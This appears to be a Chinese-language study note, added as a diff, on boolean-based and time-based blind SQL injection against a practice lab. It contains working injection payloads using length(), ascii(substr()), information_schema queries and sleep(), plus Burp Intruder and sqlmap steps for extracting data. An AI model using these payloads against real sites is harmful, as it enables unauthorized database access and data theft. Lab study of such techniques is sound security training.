@@ -1,0 +1,64 @@
+盲注：
+
+布尔盲注：页面没有输出点，但是有回显，告诉你是否有数据查询
+靶场：
+因为页面没有回显了 所以order by也因此失效了
+1.用返回字符串长度的方式猜解数据库名的字符长度 and length(database())>1 最终确定长度为12个字符 
+and length(database())=12
+
+2.算出长度后还要猜解每个字符是什么 用到substr()截取字符串 再用ascii()函数将截取的字符串转化为数字 
+and ascii(substr(database(),1,1))=107  对应的字母是k
+
+3.这样一个个试可以试出来 太浪费时间了 这时就可以用到抓包的方式了
+打开burpsuite 抓取当前网页 发送到intruder
+
+4.将Attack type 选择为Cluster bomb 因为要一次跑两个数据 如果是一个数据就选择Sniper
+
+5.点击右边清楚按键 再将1与107添加进去
+
+6.点击Payloads 选择第一个要跑的数据 先跑12个库名字符串 再跑后面的ascii转化
+Payload type选择Number 下面自己看图
+
+7.选择好之后点击Start attack进行跑包
+跑完之后点击length排个序 跑包中途出现数据不一样的会列出来
+这样Payload1中1-13的字符对应的ascii数字再Payload2中就显示出来了 因为只有12个字符
+1对应107  2对应97  ...最后拼出库名kanwolongxia
+
+8.以此类推猜表名：
+and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))=101--+ 返回正常，说明数据库表名的第一个的第一位是e 
+
+  猜字段名：
+and (ascii(substr((select column_name from information_schema.columns where table_name='zkaq' limit 0,1),1,1)))=102--+ 返回正常，说明zkaq表中的列名称第一位是f
+
+  猜内容：
+and (ascii(substr(( select zKaQ from zkaq limit 4,1),1,1)))=122--+返回正常，说明zKaQ列第一位是z
+
+
+
+延时盲注(时间盲注)：无论怎么样都没有回显
+
+if(expr1,expr2,expr3) 判断语句 如果第一个语句正确就执行第二个语句如果错误执行第三个语句
+and if(ascii(substr(database(),1,1))>120,0,sleep(10)) --+
+
+延时盲注其实和布尔盲注其实没有什么太大的区别，只不过是一个依靠页面是否正常判断，一个是否延时判断，在操作上其实也差不多，只不过延时多一个if()
+
+靶场：
+1.也是用返回字符串长度的方式猜解数据库名的字符长度 因为这次页面没有回显 所以用if(expr1,expr2,expr3) 判断语句
+and if(length(database())=12,0,sleep(5))
+
+2.算出长度后还要猜解每个字符是什么 用到substr()截取字符串 再用ascii()函数将截取的字符串转化为数字 
+and if(ascii(substr(database(),1,1))>120,0,sleep(10))
+
+3.抓包的方式 和布尔同样的方式
+
+
+
+注意：
+这种方法太难受了 建议直接sqlmap跑吧 python sqlmap.py -u 地址 回车解决 （sqlmap特别喜欢跑盲注的东西的！）
+
+如果有双引号的就增加测试等级就好啦 --level 3 --risk 3
+
+延时盲注
+and if(length(database())>1,sleep(5),1)  数据库长度大于1的时候页面延时5秒钟 否则秒回 来判断是否存在sql注入
+
+也用sqlmap跑吧 方法是一样的 如果有双引号的就增加测试等级就好啦 --level 3 --risk 3
